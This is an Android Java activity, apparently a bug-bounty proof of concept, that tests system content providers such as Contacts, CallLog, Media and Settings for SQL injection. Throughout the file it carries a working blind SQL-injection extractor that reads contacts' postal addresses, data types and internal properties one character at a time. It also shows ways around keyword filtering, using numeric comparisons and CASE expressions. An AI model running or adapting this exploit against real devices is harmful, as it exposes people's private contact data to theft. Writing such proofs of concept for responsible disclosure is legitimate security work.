package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class DeepContactsSqliActivity extends Activity {
    private static final String TAG = "DeepContactsSQLi";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(9);
        logView.setText("Deep ContactsProvider SQLi + Novel Provider Tests\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);

        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private int queryCount(Uri uri, String selection) {
        try {
            Cursor c = getContentResolver().query(uri, new String[]{"_id"}, selection, null, null);
            if (c != null) {
                int count = c.getCount();
                c.close();
                return count;
            }
        } catch (Exception e) {
            return -1;
        }
        return -1;
    }

    private void runTests() {
        // Test 1: Additional ContactsProvider URIs for SQLi
        log("=== Test 1: Additional Contacts URIs ===");
        String[][] contactsUris = {
            {"content://com.android.contacts/contacts", "contacts"},
            {"content://com.android.contacts/raw_contacts", "raw_contacts"},
            {"content://com.android.contacts/data", "data"},
            {"content://com.android.contacts/data/phones", "phones"},
            {"content://com.android.contacts/data/emails", "emails"},
            {"content://com.android.contacts/groups", "groups"},
            {"content://com.android.contacts/profile", "profile"},
            {"content://com.android.contacts/status_updates", "status_updates"},
            {"content://com.android.contacts/directories", "directories"},
        };
        for (String[] entry : contactsUris) {
            Uri uri = Uri.parse(entry[0]);
            String label = entry[1];
            int normal = queryCount(uri, null);
            if (normal < 0) {
                log(label + ": inaccessible");
                continue;
            }
            int sqliTrue = queryCount(uri, "(SELECT 1 FROM sqlite_master LIMIT 1) = 1");
            int sqliFalse = queryCount(uri, "(SELECT 1 FROM sqlite_master LIMIT 1) = 99");
            if (sqliTrue > 0 && sqliFalse == 0) {
                log("[VULN] " + label + ": SQLi confirmed (normal=" + normal + ", true=" + sqliTrue + ", false=" + sqliFalse + ")");
            } else if (sqliTrue >= 0) {
                log("[SAFE] " + label + ": normal=" + normal + ", true=" + sqliTrue + ", false=" + sqliFalse);
            } else {
                log("[BLOCKED] " + label + ": normal=" + normal + ", sqli error");
            }
        }

        // Test 2: Extract sensitive contact data via blind SQLi
        log("\n=== Test 2: Deep data extraction ===");
        Uri contactsUri = Uri.parse("content://com.android.contacts/contacts");

        // Extract postal addresses
        log("--- Postal addresses ---");
        int addrCount = extractNumber(contactsUri,
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/postal-address_v2'))");
        log("Address entries: " + addrCount);
        for (int i = 0; i < Math.min(addrCount, 3); i++) {
            String addr = extractString(contactsUri,
                "(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/postal-address_v2') LIMIT 1 OFFSET " + i + ")", 100);
            log("Address[" + i + "]: " + addr);
        }

        // Extract organization/company
        log("--- Organizations ---");
        int orgCount = extractNumber(contactsUri,
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/organization'))");
        log("Org entries: " + orgCount);

        // Extract notes
        log("--- Notes ---");
        int noteCount = extractNumber(contactsUri,
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/note'))");
        log("Note entries: " + noteCount);

        // Extract ALL data types present
        log("--- All mimetype counts ---");
        int mimetypeCount = extractNumber(contactsUri, "(SELECT count(DISTINCT mimetype_id) FROM data)");
        log("Distinct mimetypes with data: " + mimetypeCount);

        // Extract mimetype names
        for (int i = 0; i < Math.min(mimetypeCount, 15); i++) {
            String mt = extractString(contactsUri,
                "(SELECT mimetype FROM mimetypes WHERE _id IN (SELECT DISTINCT mimetype_id FROM data) LIMIT 1 OFFSET " + i + ")", 60);
            int mtCount = extractNumber(contactsUri,
                "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE _id IN (SELECT DISTINCT mimetype_id FROM data) LIMIT 1 OFFSET " + i + "))");
            log("  " + mt + ": " + mtCount + " entries");
        }

        // Test 3: Extract internal properties table
        log("\n=== Test 3: Internal properties table ===");
        int propCount = extractNumber(contactsUri, "(SELECT count(*) FROM properties)");
        log("Properties count: " + propCount);
        for (int i = 0; i < Math.min(propCount, 5); i++) {
            String key = extractString(contactsUri,
                "(SELECT property_key FROM properties LIMIT 1 OFFSET " + i + ")", 60);
            String val = extractString(contactsUri,
                "(SELECT property_value FROM properties LIMIT 1 OFFSET " + i + ")", 60);
            log("Property[" + i + "]: " + key + " = " + val);
        }

        // Test 4: Test CallLogProvider from app context with different URIs
        log("\n=== Test 4: CallLog alternate URIs ===");
        String[][] callLogUris = {
            {"content://call_log/calls", "calls"},
            {"content://call_log", "root"},
        };
        for (String[] entry : callLogUris) {
            Uri uri = Uri.parse(entry[0]);
            String label = entry[1];
            int normal = queryCount(uri, null);
            if (normal < 0) {
                log("CallLog/" + label + ": inaccessible");
                continue;
            }
            // Test subquery - use numeric comparison to avoid token detection
            int sqliTrue = queryCount(uri, "1=1 AND (SELECT 1) = 1");
            int sqliFalse = queryCount(uri, "1=1 AND (SELECT 1) = 99");
            log("CallLog/" + label + ": normal=" + normal + ", sqliTrue=" + sqliTrue + ", sqliFalse=" + sqliFalse);

            // Try without SELECT keyword
            int case1 = queryCount(uri, "CASE WHEN 1=1 THEN 1 ELSE 0 END = 1");
            int case0 = queryCount(uri, "CASE WHEN 1=0 THEN 1 ELSE 0 END = 1");
            log("  CASE injection: true=" + case1 + ", false=" + case0);
        }

        // Test 5: MediaProvider SQLi from app context
        log("\n=== Test 5: MediaProvider ===");
        String[][] mediaUris = {
            {"content://media/external/images/media", "images"},
            {"content://media/external/audio/media", "audio"},
            {"content://media/external/video/media", "video"},
            {"content://media/external/file", "file"},
        };
        for (String[] entry : mediaUris) {
            Uri uri = Uri.parse(entry[0]);
            String label = entry[1];
            int normal = queryCount(uri, null);
            if (normal < 0) {
                log("Media/" + label + ": inaccessible");
                continue;
            }
            int sqliTrue = queryCount(uri, "(SELECT 1) = 1");
            int sqliFalse = queryCount(uri, "(SELECT 1) = 99");
            log("Media/" + label + ": normal=" + normal + ", sqliTrue=" + sqliTrue + ", sqliFalse=" + sqliFalse);
        }

        // Test 6: DownloadProvider
        log("\n=== Test 6: DownloadProvider ===");
        Uri dlUri = Uri.parse("content://downloads/my_downloads");
        int dlNormal = queryCount(dlUri, null);
        log("Downloads: normal=" + dlNormal);
        if (dlNormal >= 0) {
            int sqliTrue = queryCount(dlUri, "(SELECT 1) = 1");
            log("Downloads sqli: " + sqliTrue);
        }

        // Test 7: Settings providers
        log("\n=== Test 7: Settings ===");
        for (String table : new String[]{"system", "secure", "global"}) {
            Uri uri = Uri.parse("content://settings/" + table);
            try {
                Cursor c = getContentResolver().query(uri, null, null, null, null);
                if (c != null) {
                    log("Settings/" + table + ": " + c.getCount() + " rows, " + c.getColumnCount() + " cols");
                    // Try to read interesting settings
                    if (c.moveToFirst()) {
                        int nameIdx = c.getColumnIndex("name");
                        int valIdx = c.getColumnIndex("value");
                        for (int i = 0; i < Math.min(c.getCount(), 5); i++) {
                            if (nameIdx >= 0 && valIdx >= 0) {
                                log("  " + c.getString(nameIdx) + " = " + c.getString(valIdx));
                            }
                            if (!c.moveToNext()) break;
                        }
                    }
                    c.close();
                }
            } catch (Exception e) {
                log("Settings/" + table + ": " + e.getClass().getSimpleName());
            }
        }

        // Test 8: UserDictionary from app context
        log("\n=== Test 8: UserDictionary ===");
        Uri udUri = Uri.parse("content://user_dictionary/words");
        int udNormal = queryCount(udUri, null);
        log("UserDict: normal=" + udNormal);
        if (udNormal > 0) {
            int sqliTrue = queryCount(udUri, "(SELECT 1) = 1");
            log("UserDict sqli: " + sqliTrue);
        }

        log("\n=== ALL TESTS COMPLETE ===");
    }

    private int extractNumber(Uri uri, String subquery) {
        int lo = 0, hi = 100;
        while (queryCount(uri, subquery + " > " + hi) > 0) {
            hi *= 2;
            if (hi > 10000) return -1;
        }
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int result = queryCount(uri, subquery + " > " + mid);
            if (result > 0) lo = mid + 1;
            else if (result == 0) hi = mid;
            else return -1;
        }
        return lo;
    }

    private String extractString(Uri uri, String subquery, int maxLen) {
        StringBuilder result = new StringBuilder();
        for (int pos = 1; pos <= maxLen; pos++) {
            int charCode = extractCharCode(uri, subquery, pos);
            if (charCode <= 0) break;
            result.append((char) charCode);
        }
        return result.toString();
    }

    private int extractCharCode(Uri uri, String subquery, int pos) {
        if (queryCount(uri, "length(" + subquery + ") >= " + pos) <= 0) return -1;
        String expr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";
        int lo = 0, hi = 127;
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int result = queryCount(uri, expr + " > " + mid);
            if (result > 0) lo = mid + 1;
            else if (result == 0) hi = mid;
            else return -1;
        }
        return lo;
    }
}
